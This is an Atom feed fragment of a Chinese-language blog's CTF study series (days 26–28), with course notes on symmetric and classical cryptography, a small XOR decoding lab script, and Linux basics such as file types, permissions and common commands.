href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;【成大資安社社課】淺談網路與
H T T P&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day28</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day28/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day28/</id>
    <published>2024-09-30T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1 - 完</a></label></li></ul><span id="more"></span><h2 id="上課紀錄">上課紀錄 <a href="#上課紀錄" class="headerlink"></a></h2><h3 id="xor">XOR <a href="#xor" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/TC7cmgZ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="mod">MOD <a href="#mod" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/yms7Qj7.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---xor-wormup">Lab - XOR wormup <a href="#lab---xor-wormup" class="headerlink"></a></h3><p>改一下他的程式碼就可以得到 Flag 了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="comment"># from flag import FLAG</span></span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">bytes</span>.fromhex(<span class="string">"603ad76575ed41dd3fd38be80d6edfdc569e2a324c928741129e210e2c934aa3770ff8d4f0c5340e82d9c0eea5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_bytes</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line">random_data = <span class="built_in">bytes</span>.fromhex(<span class="string">"0209e4030e9929b44c8ce29b5216b0ae09ed456d29f3f4386be7585114f22ec2436ecdb795f2506db0bff5dcd8"</span>)</span><br><span class="line">result = xor_bytes(FLAG, random_data)</span><br><span class="line"><span class="built_in">print</span>({result.decode()})</span><br></pre></td></tr></tbody></table></figure><h3 id="流密碼">流密碼 <a href="#流密碼" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/arAPaTX.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="隨機數">隨機數 <a href="#隨機數" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/EmZmTpv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h5 id="偽隨機數">偽隨機數 <a href="#偽隨機數" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/rbi5s58.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ACkE2aL.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="線性同餘生成器-linear-congruential-generator">線性同餘生成器(Linear Congruential Generator) <a href="#線性同餘生成器-linear-congruential-generator" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/qlvKoCn.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/cqS7Nan.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ATlq3yR.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/DJI6Uiy.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="其他常見方法">其他常見方法 <a href="#其他常見方法" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/b6ijdxU.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="反饋位移生成器-feedback-shift-register">反饋位移生成器 (FeedbackShift Register) <a href="#反饋位移生成器-feedback-shift-register" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/YCEkSYS.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/xRBOzHv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---eof-almost-baby-prng">lab - eof-almost baby prng <a href="#lab---eof-almost-baby-prng" class="headerlink"></a></h3><h3 id="lab---easy-lcg">lab - easy lcg <a href="#lab---easy-lcg" class="headerlink"></a></h3><h3 id="lab---eof-lf3r">lab - eof lf3r <a href="#lab---eof-lf3r" class="headerlink"></a></h3><h3 id="對稱式加密">對稱式加密 <a href="#對稱式加密" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/zO68JRG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>重點是 <strong>使用同一把鑰匙</strong></p><h4 id="基本策略">基本策略 <a href="#基本策略" class="headerlink"></a></h4><ul><li>Confusion<ul><li>混淆密文和密鑰的關係，使難以從密文推斷出密鑰</li></ul></li><li>Defusion<ul><li>改變一點點明文，就能改變很多密文</li></ul></li></ul><h4 id="feistel-network">Feistel Network <a href="#feistel-network" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/dGaAKs5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="des-data-encryption-standard">DES (Data Encryption Standard) <a href="#des-data-encryption-standard" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/fLYccox.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/sJ9GnKY.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/leafhwv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/N3xsOAS.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="substitution-permutation-network">Substitution-PermutationNetwork <a href="#substitution-permutation-network" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/URyyjmX.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="aes-advanced-encryption-standard">AES (Advanced EncryptionStandard) <a href="#aes-advanced-encryption-standard" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/0OW7vJe.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/qh3p4NV.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/cXFzP3U.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/kPJEXG2.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="todo">TODO <a href="#todo" class="headerlink"></a></h2><p>之後好好研究一下原理還有把上面三題 lab 做完</p><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;【成大資安社社課】Crypto
1 - 完&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day27</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day27/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day27/</id>
    <published>2024-09-29T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1 - 古典密碼學</a></label></li></ul><span id="more"></span><h2 id="crypto-1">Crypto 1 <a href="#crypto-1" class="headerlink"></a></h2><p><a href="https://cryptohack.org/">棒棒的練習資源</a></p><ul><li>編碼</li><li>古典密碼</li><li>穿插「ㄧ」點數學</li><li>流加密</li><li>對稱式加密</li></ul><h3 id="先裝套件">先裝套件 <a href="#先裝套件" class="headerlink"></a></h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></tbody></table></figure><h3 id="什麼是編碼">什麼是編碼 <a href="#什麼是編碼" class="headerlink"></a></h3><blockquote><p>「編碼器（英語：Encoder）是一種將資訊由一種特定格式轉換為其他特定格式的感測器、軟體或是演算法，轉換的目的可能是由於標準化、速度、保密性、保安或是為了壓縮資料。」—— 維基百科</p></blockquote><figure><img data-src="https://i.imgur.com/H9jeJa0.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ZDIXlGI.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/OFKzyLQ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="常見文字編碼">常見文字編碼 <a href="#常見文字編碼" class="headerlink"></a></h4><ul><li>ASCI<ul><li>用一個 byte來表示字母、數字、符號，是針對英文設計的，Unicode 的最初 128 個字符與 ASCII 完全相同(因為只有了 128 種可能，所以最左邊的 bit 永遠是 0)</li></ul></li><li>UTF-8<ul><li>用 1~4 bytes 來表示一個字符，也包含了 ASCII 的字符，因為 ASCII的字符只用 1 byte 表示，所以 UTF-8 能完全兼容原先是 ASCII編碼的文件</li><li>容納了各國語言，算是 Unicode 的一種實現方式</li></ul></li><li>HEX (16 進位)</li><li>Base64<ul><li>用 64 個字符來表示二進位數據，常用於在URL、Cookie、網頁中傳輸少量二進位數據，常見編碼結果會有 =, ==</li></ul></li></ul><h4 id="lab---complex-encoder">Lab - Complex Encoder <a href="#lab---complex-encoder" class="headerlink"></a></h4><p>要先用 Base64 解碼，再用 HEX 解碼</p><figure><img data-src="https://i.imgur.com/DDWsPyn.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="lab---fk-encoder">Lab - F**k Encoder <a href="#lab---fk-encoder" class="headerlink"></a></h4><p>用 BrainFuck 和 JSFuck 都試試看，然後發現用 <a href="https://enkhee-osiris.github.io/Decoder-JSFuck/">JSFuck</a> 解密Flag 就出來了</p><h3 id="古典密碼學">古典密碼學 <a href="#古典密碼學" class="headerlink"></a></h3><h4 id="加解密的用途">加解密的用途 <a href="#加解密的用途" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/0spEvIQ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>即便被攔截如果加解密夠好，也能確保密文不被破譯</p><h4 id="常見的加解密">常見的加解密 <a href="#常見的加解密" class="headerlink"></a></h4><ul><li>凱薩密碼<ul><li>ROT13</li><li>曹操密碼</li></ul></li><li>簡易替換密碼<ul><li><figure><img data-src="https://i.imgur.com/WHjuU9j.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li><li>解密方式：頻率分析</li><li><figure><img data-src="https://i.imgur.com/MjPl9kx.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li></ul></li><li>維吉尼亞密碼（Vigenere）<ul><li><figure><img data-src="https://i.imgur.com/cxikvpz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li><li><figure><img data-src="https://i.imgur.com/sbkAIfj.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li><li>用密鑰長度切分，每一段相同位置的偏移量會相同 (例如上圖的 CSASTPK 的 K和 CSASTPI 的 I 同樣都是向右偏移兩格)，這樣就能分別對相同位置的字幕做頻率分析</li></ul></li><li>波雷費密碼 (Playfair)<ul><li><figure><img data-src="https://i.imgur.com/I15FDJ3.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li></ul></li><li>柵欄密碼 (Rail fence)<ul><li><figure><img data-src="https://i.imgur.com/NwrUS0z.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure></li><li>密鑰是有幾個 <code>_</code></li></ul></li></ul><h4 id="lab---vigenere-cipher">Lab - vigenere cipher <a href="#lab---vigenere-cipher" class="headerlink"></a></h4><p><a href="https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">線上解密工具</a></p><p>然後找了一下就發現了一個看起來像正確 flag 的字串</p><figure><img data-src="https://i.imgur.com/BK3rebA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="lab---secure-substitution">Lab - secure substitution <a href="#lab---secure-substitution" class="headerlink"></a></h4><p><a href="secure%20substitution">線上解密工具</a></p><p>丟上去跑出來的第一個就是 Flag 了</p><figure><img data-src="https://i.imgur.com/beCSHYP.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;【成大資安社社課】Crypto
1 - 古典密碼學&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day26</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day26/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day26/</id>
    <published>2024-09-28T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></label></li></ul><span id="more"></span><h2 id="linux-基礎指令與使用者管理">Linux 基礎指令與使用者管理 <a href="#linux-基礎指令與使用者管理" class="headerlink"></a></h2><figure><img data-src="https://i.imgur.com/crswIVm.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="kernel-space-vs-user-space">Kernel Space vs User Space <a href="#kernel-space-vs-user-space" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/Cmt2y72.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>區分成這樣是為了讓 Kernel 方便管理 User Space 的 Application，避免有些 Application 搶資源，這時候就可以由 Kernel Space停止那些指令運行</p><h3 id="shell">Shell <a href="#shell" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/RFSND8t.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ssh">SSH <a href="#ssh" class="headerlink"></a></h3><p>Secure Shell Protocol</p><figure><img data-src="https://i.imgur.com/L8lFFSA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://blog.gtwang.org/linux/linux-ssh-public-key-authentication/">SSH金鑰登入 就不用打密碼了</a></p><h3 id="linux-目錄架構">Linux 目錄架構 <a href="#linux-目錄架構" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/aIJTb9C.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="檔案種類">檔案種類 <a href="#檔案種類" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/2dh0cQk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="正規檔案-regular-file">正規檔案 (Regular File) <a href="#正規檔案-regular-file" class="headerlink"></a></h4><ul><li>檔案類型：<code>-</code></li><li>純文字檔 (ASCII)、二進位檔 (binary)、資料格式檔 (data)</li></ul><h4 id="目錄-directory">目錄 (Directory) <a href="#目錄-directory" class="headerlink"></a></h4><ul><li>檔案類型：<code>d</code></li><li>就是目錄</li></ul><h4 id="連結檔link">連結檔 (link) <a href="#連結檔link" class="headerlink"></a></h4><ul><li>檔案類型：<code>l</code></li><li>就同於 Windows 下的捷徑</li></ul><h4 id="設備與裝置檔device">設備與裝置檔 (device) <a href="#設備與裝置檔device" class="headerlink"></a></h4><ul><li>區塊 (block) 設備檔<ul><li>檔案類型：b</li><li>硬碟或儲存設備</li></ul></li><li>字元 (character) 設備檔<ul><li>檔案類型：c</li><li>鍵盤、滑鼠等</li></ul></li></ul><h4 id="資料接口檔sockets">資料接口檔 (sockets) <a href="#資料接口檔sockets" class="headerlink"></a></h4><ul><li>檔案類型：s</li><li>讓兩個程式做溝通，讓一個程式把資料灌進 sockets ，另一個程式就可以從sockets 拿資料</li></ul><h4 id="資料輸送檔fifo-pipe">資料輸送檔 (FIFO, pipe) <a href="#資料輸送檔fifo-pipe" class="headerlink"></a></h4><ul><li>檔案類型：p</li><li>讓不同進程間能溝通</li></ul><h3 id="用戶與群組">用戶與群組 <a href="#用戶與群組" class="headerlink"></a></h3><p>用戶：就用戶<br>群組：主群組和附加群組</p><h4 id="用戶-etcpassword">用戶 /etc/password <a href="#用戶-etcpassword" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/7j0LQsL.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>密碼不會存在這，所以上面是寫 <code>x</code></p><h4 id="用戶-etcshadow">用戶 /etc/shadow <a href="#用戶-etcshadow" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/VBwPnAJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="群組-etcgroup">群組 /etc/group <a href="#群組-etcgroup" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/x6EP4D5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="群組-etcgshadow">群組 /etc/gshadow <a href="#群組-etcgshadow" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/cb7ZUgf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="權限">權限 <a href="#權限" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/uYL8Ucw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="目錄的權限">目錄的權限 <a href="#目錄的權限" class="headerlink"></a></h4><blockquote><p>r ：<br><br>表示具有讀取目錄結構清單的權限，可以查詢該目錄下的檔名資料。<br><br>w ：<br><br>建立新的檔案與目錄；<br><br>刪除已經存在的檔案與目錄 (不論該檔案的權限為何！)<br><br>將已存在的檔案或目錄進行更名；<br><br>搬移該目錄內的檔案、目錄位置。<br><br>x (access directory)：<br><br>使用者能否進入該目錄成為工作目錄的用途（能否 cd 進入）<br></p></blockquote><figure><img data-src="https://i.imgur.com/WrkLjvg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="特殊權限-suidsgidsbit">特殊權限 SUID/SGID/SBIT <a href="#特殊權限-suidsgidsbit" class="headerlink"></a></h4><blockquote><p>SUID：執行時相當於擁有檔案 owner 的權限，僅對檔案生效<br><br>SGID：<br><br>對檔案設定：執行時相當於擁有檔案 group 的權限<br><br>對目錄設定：此目錄下的有效群組 (effectivegroup) 將會變成該目錄的群組<br><br>SBIT：僅能對目錄設定，使用者在該目錄下建立檔案或目錄時，僅有自己與 root才有權力刪除該檔案<br><br>SUID = 4 SGID = 2 SBIT = 1 _755</p></blockquote><figure><img data-src="https://i.imgur.com/sixviML.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="umask">Umask <a href="#umask" class="headerlink"></a></h4><p>他的值會是 777 減去 umask 的值，所以如果 umask 是 022 的話，那就是755</p><p><code>-S</code>: 顯示成比較好檢視的樣子</p><figure><img data-src="https://i.imgur.com/z3UIhku.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="未知的指令">未知的指令 <a href="#未知的指令" class="headerlink"></a></h3><ul><li>Google</li><li><code>man xxx</code></li><li><code>xxx -h</code> / <code>xxx --help</code></li></ul><h3 id="常見指令">常見指令 <a href="#常見指令" class="headerlink"></a></h3><ul><li><code>cd</code>: change directory (可用絕對路徑或相對路徑)</li><li><code>pwd</code>: print working directory</li><li><code>ls</code>: list<ul><li><code>-a</code>: 顯示隱藏檔</li><li><code>-l</code>: 顯示詳細資訊 (<code>ll</code> 是 <code>ls -l</code>的縮寫)</li></ul></li><li><code>exa</code>: 跟 <code>ls</code> 類似，但是有顏色</li><li><code>rm</code>: remove<ul><li><code>-r</code>: 遞迴刪除</li><li><code>-f</code>: 強制刪除</li></ul></li><li><code>cp</code>: copy</li><li><code>mv</code>: move</li><li><code>cat</code>: concatenate</li><li><code>tac</code>: 反向顯示</li><li><code>od</code>: octal dump</li><li><code>nl</code>: number lines (會把檔案的每一行編號)</li><li><code>more</code>: 一次顯示一頁</li><li><code>less</code>: 也是一次顯示一頁，但是可以往前翻 (vim的操作方式)</li><li><code>mkdir</code>: make directory</li><li><code>touch</code>: 建立檔案</li><li><code>rmdir</code>: remove directory</li><li><code>nano</code>: 編輯器</li><li><code>vi</code>: 很棒的編輯器</li><li><code>vim</code>: 更棒的編輯器</li><li><code>chmod</code>: change mode<ul><li><code>chmod 777 xxx</code>: 三個數字分別代表user/group/others，每個數字代表 rwx，所以 777 就是全部都有 rwx</li><li><code>chmod -x xxx</code>: 移除所有人對 xxx 的執行權限</li><li><code>chmod +x xxx</code>: 給所有人對 xxx 的執行權限</li><li><code>chmod u+x xxx</code>: 給 user 對 xxx 的執行權限 (u = user, g =group, o = others, a = all)</li><li>也可設定 SUID/SGID/SBIT 可以用 <code>chmod 4755 xxx</code> 來設定SUID ，然後<code>+s</code> 來設定 SUID / SGID，<code>+t</code> 來設定SBIT</li></ul></li><li><code>chown</code>: change owner<ul><li><code>chown user xxx</code>: 把 xxx 的 owner 改成 user</li><li><code>chown user:group xxx</code>: 把 xxx 的 owner 改成 user，group改成 group</li></ul></li><li><code>chgrop</code>: change group<ul><li><code>chgrp group xxx</code>: 把 xxx 的 group 改成 group</li></ul></li><li><code>chattr</code>: change attribute<ul><li><code>chattr +i xxx</code>: 讓 xxx 變成不可刪除</li><li><code>chattr +a xxx</code>: 讓 xxx 變成只能增加資料，不能刪除</li><li>其他不常用需要再看</li></ul></li><li><code>lsattr</code>: 顯示檔案屬性</li><li><code>passwd</code>: 更改密碼</li><li><code>which</code> / <code>whereis</code>: 找指令的位置</li><li><code>tar</code>: 包裝 or 壓縮檔案<ul><li><code>v</code>: 